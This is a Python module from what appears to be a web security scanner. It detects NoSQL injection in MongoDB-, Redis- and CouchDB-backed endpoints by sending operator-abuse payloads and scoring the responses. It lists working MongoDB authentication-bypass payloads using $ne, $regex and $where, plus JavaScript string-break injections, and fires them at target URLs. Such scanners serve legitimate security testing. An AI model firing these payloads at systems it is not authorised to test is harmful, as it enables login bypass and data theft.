"""
modules/nosql_injection.py - NoSQL Injection Detector
Detects MongoDB, Redis, CouchDB injection via operator abuse and type confusion.
"""

import re
import json
import logging
import urllib.parse
from typing import Dict, List, Any, Optional
from core.http_engine import HTTPClient
from core.state_manager import StateManager

logger = logging.getLogger("recon.nosql_injection")


class NoSQLInjectionDetector:
    """
    Detects NoSQL injection vulnerabilities.

    Attack vectors:
    1. MongoDB operator injection: $gt, $ne, $where, $regex
    2. JSON type confusion: string → object/array
    3. PHP/Python array syntax: param[]=value, param[$ne]=1
    4. Authentication bypass via $ne operator
    5. CouchDB Mango query injection
    6. Redis command injection via CRLF
    """

    # MongoDB operator payloads for auth bypass
    MONGO_AUTH_BYPASS = [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin", "password": {"$gt": ""}},
        {"$where": "1==1"},
    ]

    # Query parameter-based MongoDB injection
    MONGO_PARAM_PAYLOADS = [
        # Array/object injection
        {"[$ne]": "1"},
        {"[$gt]": ""},
        {"[$regex]": ".*"},
        {"[$where]": "1==1"},
        # Direct string payloads
        {"": "'; return true; var a='"},
        {"": "'; return '' == '"},
    ]

    # Payloads that indicate successful injection by altering query behavior
    NOSQL_STRING_PAYLOADS = [
        "[$ne]=1",
        "[$gt]=",
        "[$regex]=.*",
        "true, $where: '1 == 1'",
        "'; return true; var foo='",
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "function(){return true;}"}',
    ]

    NOSQL_PARAM_NAMES = {
        "username", "user", "email", "login", "password", "passwd", "pass",
        "id", "user_id", "uid", "query", "q", "search", "find", "filter",
        "where", "selector", "sort", "limit", "skip", "fields", "match",
        "name", "key", "token", "auth", "api_key",
    }

    ERROR_PATTERNS = [
        r"SyntaxError.*JSON",
        r"MongoError",
        r"MongoServerError",
        r"BsonTypeError",
        r"CastError",
        r"MongoDB.*query",
        r"\$where",
        r"\$ne",
        r"CouchDB",
        r"redis.*error",
        r"WRONGTYPE",
        r"ERR.*wrong.*type",
    ]

    def __init__(self, state: StateManager = None, http_client: HTTPClient = None):
        self.state = state
        self.http_client = http_client or HTTPClient()

    # Technologies that confirm a relational DB backend — skip NoSQL tests on these hosts
    _RDBMS_TECH_MARKERS = frozenset([
        "mysql", "postgresql", "postgres", "mssql", "sqlserver",
        "sqlite", "mariadb", "oracle", "db2",
    ])

    def _host_has_confirmed_rdbms(self, url: str) -> bool:
        """Return True if the state shows a confirmed RDBMS tech for this host."""
        if not self.state:
            return False
        try:
            parsed = urllib.parse.urlparse(url)
            host = parsed.netloc or parsed.path
            technologies = self.state.get("technologies", {}) or {}
            # technologies dict: { host: { tech_name: ... } } or { host: [str, ...] }
            for tech_host, tech_data in technologies.items():
                if host not in str(tech_host):
                    continue
                if isinstance(tech_data, dict):
                    tech_keys = " ".join(tech_data.keys()).lower()
                elif isinstance(tech_data, list):
                    tech_keys = " ".join(str(t) for t in tech_data).lower()
                else:
                    tech_keys = str(tech_data).lower()
                if any(m in tech_keys for m in self._RDBMS_TECH_MARKERS):
                    return True
            # Also check live_hosts tech fingerprints
            for lh in (self.state.get("live_hosts", []) or []):
                lh_url = lh.get("url", "")
                if host not in lh_url:
                    continue
                tech_list = lh.get("tech", []) or []
                tech_str = " ".join(str(t) for t in tech_list).lower()
                if any(m in tech_str for m in self._RDBMS_TECH_MARKERS):
                    return True
        except Exception:
            pass
        return False

    def detect(self, endpoints: List[Any], progress_cb=None) -> Dict[str, Any]:
        """Scan endpoints for NoSQL injection."""
        logger.info(f"[NOSQL] Starting NoSQL injection detection on {len(endpoints)} endpoints")

        results = {
            "vulnerabilities": [],
            "endpoints_tested": 0,
            "nosql_confirmed": 0,
        }

        for i, endpoint in enumerate(endpoints):
            if progress_cb:
                progress_cb(i, len(endpoints))

            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
                raw_params = endpoint.get("parameters") or endpoint.get("query_params") or []
                if isinstance(raw_params, dict):
                    params = list(raw_params.keys())
                else:
                    params = list(raw_params)
                method = (endpoint.get("method") or "GET").upper()
            else:
                url = str(endpoint)
                params = []
                method = "GET"

            if not url:
                continue

            # Skip endpoints whose host is confirmed to run a relational DB backend —
            # NoSQL operator payloads on MySQL/PostgreSQL only create noise.
            if self._host_has_confirmed_rdbms(url):
                logger.debug(f"[NOSQL] Skipping {url}: confirmed RDBMS tech on host")
                results["endpoints_tested"] += 1
                continue

            parsed = urllib.parse.urlparse(url)
            url_params = list(urllib.parse.parse_qs(parsed.query).keys())
            all_params = list(set(params + url_params))

            vuln = self._test_nosql(url, all_params, method)
            if vuln.get("vulnerable"):
                results["vulnerabilities"].append(vuln)
                results["nosql_confirmed"] += 1

            results["endpoints_tested"] += 1

        logger.info(f"[NOSQL] Found {results['nosql_confirmed']} NoSQL injection vulnerabilities")
        return results

    def _test_nosql(self, url: str, params: List[str], method: str) -> Dict[str, Any]:
        """Test endpoint for NoSQL injection."""
        result = {
            "url": url,
            "method": method,
            "vulnerable": False,
            "confidence": 0.0,
            "db_type": None,
            "evidence": [],
        }

        # Get baseline first
        try:
            baseline = self.http_client.get(url, timeout=10)
            baseline_text = baseline.text
            baseline_status = baseline.status_code
        except Exception:
            baseline_text = ""
            baseline_status = 0

        # Test JSON body injection (POST endpoints)
        if method in ["POST", "PUT", "PATCH"]:
            for payload in self.MONGO_AUTH_BYPASS:
                try:
                    resp = self.http_client.post(
                        url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                    )
                    check = self._check_indicators(resp, baseline_status, baseline_text)
                    if check["score"] > 0.5:
                        result["vulnerable"] = True
                        result["confidence"] = check["score"]
                        result["db_type"] = check.get("db_type", "MongoDB")
                        result["evidence"].append({
                            "payload": str(payload),
                            "indicator": check["reason"],
                            "status": resp.status_code,
                        })
                        if result["confidence"] >= 0.8:
                            return result
                except Exception as e:
                    logger.debug(f"[NOSQL] JSON body test error on {url}: {e}")

        # Test query parameter injection
        # Use a higher threshold (0.6) for GET-param tests to avoid false positives
        # from APIs that simply return different payload sizes for different inputs.
        # Only "response size changed" alone (score=0.5) is NOT sufficient evidence;
        # we require at least an error pattern or auth-bypass change.
        nosql_params = [p for p in params if p.lower() in self.NOSQL_PARAM_NAMES] or params[:4]
        for param in nosql_params:
            for payload_kv in self.MONGO_PARAM_PAYLOADS:
                for suffix, value in payload_kv.items():
                    try:
                        test_url = self._inject_array_param(url, param, suffix, value)
                        resp = self.http_client.get(test_url, timeout=10)
                        check = self._check_indicators(resp, baseline_status, baseline_text)
                        if check["score"] > 0.6:
                            result["vulnerable"] = True
                            result["confidence"] = max(result["confidence"], check["score"])
                            result["db_type"] = check.get("db_type", "MongoDB")
                            result["evidence"].append({
                                "param": f"{param}{suffix}",
                                "value": value,
                                "indicator": check["reason"],
                                "status": resp.status_code,
                            })
                            if result["confidence"] >= 0.8:
                                return result
                    except Exception as e:
                        logger.debug(f"[NOSQL] Param test error: {e}")

        return result

    def _inject_array_param(self, url: str, param: str, suffix: str, value: str) -> str:
        """Inject MongoDB array-style parameter: param[$ne]=1"""
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        qs[f"{param}{suffix}"] = [str(value)]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _check_indicators(
        self, response, baseline_status: int, baseline_text: str
    ) -> Dict[str, Any]:
        """Check for NoSQL injection success indicators."""
        score = 0.0
        reason = ""
        db_type = None
        text = response.text if hasattr(response, "text") else ""

        # Error-based detection
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                score += 0.4
                reason = f"NoSQL error pattern: {pattern}"
                if "mongo" in pattern.lower():
                    db_type = "MongoDB"
                elif "redis" in pattern.lower():
                    db_type = "Redis"
                elif "couch" in pattern.lower():
                    db_type = "CouchDB"
                break

        # Authentication bypass: was 401/403, now 200
        if baseline_status in [401, 403] and response.status_code == 200:
            score = max(score, 0.85)
            reason = reason or "Auth bypass: status changed from denied to allowed"
            db_type = db_type or "MongoDB"

        # Response difference: content changed significantly.
        # On its own this is only weak evidence (any dynamic API can vary size);
        # cap at 0.35 to avoid triggering the 0.6 threshold by itself.
        # It can combine with other signals (e.g., error pattern = 0.4 + size = 0.35 → 0.75).
        if (response.status_code == 200 and baseline_status == 200
                and len(text) > len(baseline_text) * 1.5):
            score = max(score, 0.35)
            reason = reason or "Response size increased significantly (data leakage)"

        # MongoDB-specific data patterns — strong independent indicator
        mongo_patterns = [r'"_id"\s*:', r'"__v"\s*:', r'ObjectId\(', r'"createdAt"\s*:']
        for p in mongo_patterns:
            if re.search(p, text):
                score = max(score, 0.65)
                reason = reason or "MongoDB document structure in response"
                db_type = "MongoDB"
                break

        return {"score": min(score, 1.0), "reason": reason, "db_type": db_type}


def detect_nosql(
    state: StateManager, endpoints: List[Any], progress_cb=None
) -> Dict[str, Any]:
    """Standalone function for NoSQL injection detection."""
    detector = NoSQLInjectionDetector(state=state)
    return detector.detect(endpoints, progress_cb)
